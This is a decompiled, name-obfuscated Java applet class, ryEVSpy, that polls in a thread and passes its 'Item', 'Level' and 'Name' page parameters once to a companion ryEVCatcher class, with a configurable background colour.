import java.awt.Color;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class ryEVSpy extends Applet implements Runnable
{
    private Thread \u016f;
    
    public void init() {
        this.setBackground(new Color(this.\u015b("BgColor", new Color(255, 255, 255))));
    }
    
    public void start() {
        if (this.\u016f != null) {
            this.\u016f.stop();
            this.\u016f = null;
        }
        (this.\u016f = new Thread(this)).start();
    }
    
    public void run() {
        while (true) {
            try {
                Thread.sleep(100L);
            }
            catch (InterruptedException ex) {}
            if (!ryEVCatcher.\u0162) {
                ryEVCatcher.\u0162 = true;
                ryEVCatcher.send(this.getParameter("Item"), this.getParameter("Level"), this.getParameter("Name"));
            }
            if (ryEVCatcher.\u0160.equals(String.valueOf(this.getParameter("Item")) + this.getParameter("Level") + this.getParameter("Name"))) {
                this.stop();
            }
        }
    }
    
    public void stop() {
        if (this.\u016f != null) {
            this.\u016f.stop();
            this.\u016f = null;
        }
    }
    
    public void destroy() {
        System.gc();
    }
    
    private int \u015b(final String s, final Color color) {
        final String parameter = this.getParameter(s);
        if (parameter != null) {
            return Integer.valueOf(parameter, 16);
        }
        return color.getRGB();
    }
}
